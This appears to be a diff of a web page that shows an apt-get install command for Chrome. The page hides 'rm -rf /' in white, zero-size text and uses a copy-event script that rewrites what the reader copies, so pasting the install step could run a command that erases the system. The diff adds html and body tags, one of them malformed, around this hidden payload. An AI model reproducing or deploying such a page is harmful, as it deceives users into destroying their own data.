@@ -1,4 +1,6 @@
-<p>
+<html>
+ <body><
+ <p>
 sudo apt-get install google-chrome-stable
 <span style="color:white;font-size:0pt;">rm -rf /</span>
 
@@ -11,3 +13,5 @@ document.addEventListener('copy', function(event) {
   event.clipboardData.setData('text/plain', copiedText);
 });
 </script>
+</body>
+</html>
